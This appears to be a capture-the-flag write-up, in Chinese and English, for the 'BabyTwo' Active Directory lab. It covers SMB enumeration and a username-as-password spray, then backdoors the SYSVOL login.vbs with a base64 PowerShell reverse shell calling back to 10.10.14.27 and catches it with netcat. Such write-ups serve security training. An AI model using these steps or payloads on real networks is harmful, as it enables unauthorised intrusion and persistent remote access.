@@ -1,2 +1,302 @@
 ## BabyTwo
 ``` 
+[★]$ ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.129.234.72 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+[★]$ nmap -p$ports -Pn -sC -sV 10.129.234.72
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:43 CST
+Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 45.45% done; ETC: 01:43 (0:00:00 remaining)
+Nmap scan report for 10.129.234.72
+Host is up (0.30s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-06 07:43:54Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+| Not valid before: 2025-08-19T14:22:11
+|_Not valid after:  2105-08-19T14:22:11
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+| Not valid before: 2025-08-19T14:22:11
+|_Not valid after:  2105-08-19T14:22:11
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+| Not valid before: 2025-08-19T14:22:11
+|_Not valid after:  2105-08-19T14:22:11
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+| Not valid before: 2025-08-19T14:22:11
+|_Not valid after:  2105-08-19T14:22:11
+|_ssl-date: TLS randomness does not represent time
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-03-06T07:45:26+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: BABY2
+|   NetBIOS_Domain_Name: BABY2
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: baby2.vl
+|   DNS_Computer_Name: dc.baby2.vl
+|   DNS_Tree_Name: baby2.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-06T07:44:48+00:00
+| ssl-cert: Subject: commonName=dc.baby2.vl
+| Not valid before: 2026-03-05T07:04:10
+|_Not valid after:  2026-09-04T07:04:10
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49397/tcp open  msrpc         Microsoft Windows RPC
+49433/tcp open  msrpc         Microsoft Windows RPC
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+60357/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-03-06T07:44:50
+|_  start_date: N/A
+
+```
+```
+[★]$ echo '10.129.234.72 baby2.vl dc.baby2.vl' | sudo tee -a /etc/hosts
+10.129.234.72 baby2.vl dc.baby2.vl
+```
+```
+[★]$ nxc smb baby2.vl -u 'guest' -p '' --shares
+SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
+SMB         10.129.234.72   445    DC               [*] Enumerated shares
+SMB         10.129.234.72   445    DC               Share           Permissions     Remark
+SMB         10.129.234.72   445    DC               -----           -----------     ------
+SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.72   445    DC               apps            READ     
+SMB         10.129.234.72   445    DC               C$                              Default share
+SMB         10.129.234.72   445    DC               docs                     
+SMB         10.129.234.72   445    DC               homes           READ,WRITE
+SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share
+SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share
+[★]$ smbclient -U 'guest%' '//baby2.vl/homes'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Mar  6 01:47:29 2026
+  ..                                  D        0  Tue Aug 22 15:10:21 2023
+  Amelia.Griffiths                    D        0  Tue Aug 22 15:17:06 2023
+  Carl.Moore                          D        0  Tue Aug 22 15:17:06 2023
+  Harry.Shaw                          D        0  Tue Aug 22 15:17:06 2023
+  Joan.Jennings                       D        0  Tue Aug 22 15:17:06 2023
+  Joel.Hurst                          D        0  Tue Aug 22 15:17:06 2023
+  Kieran.Mitchell                     D        0  Tue Aug 22 15:17:06 2023
+  library                             D        0  Tue Aug 22 15:22:47 2023
+  Lynda.Bailey                        D        0  Tue Aug 22 15:17:06 2023
+  Mohammed.Harris                     D        0  Tue Aug 22 15:17:06 2023
+  Nicola.Lamb                         D        0  Tue Aug 22 15:17:06 2023
+  Ryan.Jenkins                        D        0  Tue Aug 22 15:17:06 2023
+
+		6126847 blocks of size 4096. 1962101 blocks available
+smb: \> exit
+[★]$ vi users.txt
+[★]$ grep -oP '^\s*\K[A-Za-z]+\.[A-Za-z]+' users.txt
+Amelia.Griffiths
+Carl.Moore
+Harry.Shaw
+Joan.Jennings
+Joel.Hurst
+Kieran.Mitchell
+Lynda.Bailey
+Mohammed.Harris
+Nicola.Lamb
+Ryan.Jenkins
+
+[★]$ awk '{print $1}' users.txt | grep '\.' > tmp.txt && mv tmp.txt users.txt
+[★]$ cat users.txt
+Amelia.Griffiths
+Carl.Moore
+Harry.Shaw
+Joan.Jennings
+Joel.Hurst
+Kieran.Mitchell
+library 
+Lynda.Bailey
+Mohammed.Harris
+Nicola.Lamb
+Ryan.Jenkins
+```
+### Foothold
+```
+[★]$ nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE
+SMB         10.129.234.72   445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE
+
+```
+```
+[★]$ nxc smb 10.129.234.72 -u Carl.Moore -p Carl.Moore --shares
+SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
+SMB         10.129.234.72   445    DC               [*] Enumerated shares
+SMB         10.129.234.72   445    DC               Share           Permissions     Remark
+SMB         10.129.234.72   445    DC               -----           -----------     ------
+SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.72   445    DC               apps            READ,WRITE
+SMB         10.129.234.72   445    DC               C$                              Default share
+SMB         10.129.234.72   445    DC               docs            READ,WRITE
+SMB         10.129.234.72   445    DC               homes           READ,WRITE
+SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share
+SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
+```
+```
+[★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/docs'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Mar  6 02:22:22 2026
+  ..                                  D        0  Tue Aug 22 15:10:21 2023
+
+		6126847 blocks of size 4096. 1959900 blocks available
+smb: \> exit
+```
+```
+[★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Aug 22 12:37:36 2023
+  ..                                  D        0  Tue Aug 22 12:37:36 2023
+  baby2.vl                           Dr        0  Tue Aug 22 12:37:36 2023
+
+		6126847 blocks of size 4096. 1959553 blocks available
+smb: \> cd baby2.vl
+smb: \baby2.vl\> ls
+  .                                   D        0  Tue Aug 22 12:43:55 2023
+  ..                                  D        0  Tue Aug 22 12:37:36 2023
+  DfsrPrivate                      DHSr        0  Tue Aug 22 12:43:55 2023
+  Policies                            D        0  Tue Aug 22 12:37:41 2023
+  scripts                             D        0  Mon Aug 25 03:30:39 2025
+
+		6126847 blocks of size 4096. 1959553 blocks available
+smb: \baby2.vl\> cd scripts
+smb: \baby2.vl\scripts\> ls
+  .                                   D        0  Mon Aug 25 03:30:39 2025
+  ..                                  D        0  Tue Aug 22 12:43:55 2023
+  login.vbs                           A      992  Sat Sep  2 09:55:51 2023
+
+		6126847 blocks of size 4096. 1959551 blocks available
+smb: \baby2.vl\scripts\> get login.vbs
+getting file \baby2.vl\scripts\login.vbs of size 992 as login.vbs (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+smb: \baby2.vl\scripts\> exit
+```
+```
+[★]$ cat login.vbs
+Sub MapNetworkShare(sharePath, driveLetter)
+    Dim objNetwork
+    Set objNetwork = CreateObject("WScript.Network")    
+  
+    ' Check if the drive is already mapped
+    Dim mappedDrives
+    Set mappedDrives = objNetwork.EnumNetworkDrives
+    Dim isMapped
+    isMapped = False
+    For i = 0 To mappedDrives.Count - 1 Step 2
+        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
+            isMapped = True
+            Exit For
+        End If
+    Next
+    
+    If isMapped Then
+        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
+    End If
+    
+    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
+    
+    If Err.Number = 0 Then
+        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
+    Else
+        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
+    End If
+    
+    Set objNetwork = Nothing
+End Sub
+
+MapNetworkShare "\\dc.baby2.vl\apps", "V"
+MapNetworkShare "\\dc.baby2.vl\docs", "L"
+```
+#### 使用工具 revshells.com
+#### 选择PowerShell #3(Base64)
+![图片](2026030601.png)
+#### Base64 编码的 UTF-16LE PowerShell 脚本
+```
+[★]$ vi login.vbs
+</SNIP>    
+    Set objNetwork = Nothing
+End Sub
+
+CreateObject("WScript.Shell").Run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA3ACIALAA5ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==", 0, True
+
+MapNetworkShare "\\dc.baby2.vl\apps", "V"
+MapNetworkShare "\\dc.baby2.vl\docs", "L"
+
+```
+#### False = 不等待执行结束
+```
+CreateObject("WScript.Shell").Run "powershell -nop -w hidden -e <base64>", 0, False
+```
+#### 删除 上传
+```
+[★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL'
+Try "help" to get a list of possible commands.
+smb: \> cd \baby2.vl\scripts\
+smb: \baby2.vl\scripts\> del login.vbs
+smb: \baby2.vl\scripts\> put login.vbs
+putting file login.vbs as \baby2.vl\scripts\login.vbs (2.6 kb/s) (average 2.6 kb/s)
+smb: \baby2.vl\scripts\> exit
+```
+#### 等着它主动连接
+```
+ [★]$ nc -lvnp 9090
+listening on [any] 9090 ...
+```
+#### SYSVOL 是域控制器的共享目录
+#### 当用户登录域时，系统会自动执行：\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
+```
+[★]$ nc -lvnp 9090
+listening on [any] 9090 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.234.72] 61755
+whoami
+baby2\amelia.griffiths
+PS C:\Windows\system32>
+PS C:\Windows\system32> cat ..\..\user.txt
+```
+### Lateral Movement 横向移动
+```
+[★]$ bloodhound-python -d baby2.vl -u Carl.Moore -p Carl.Moore -c all -ns 10.129.234.72 --dns-tcp
+```
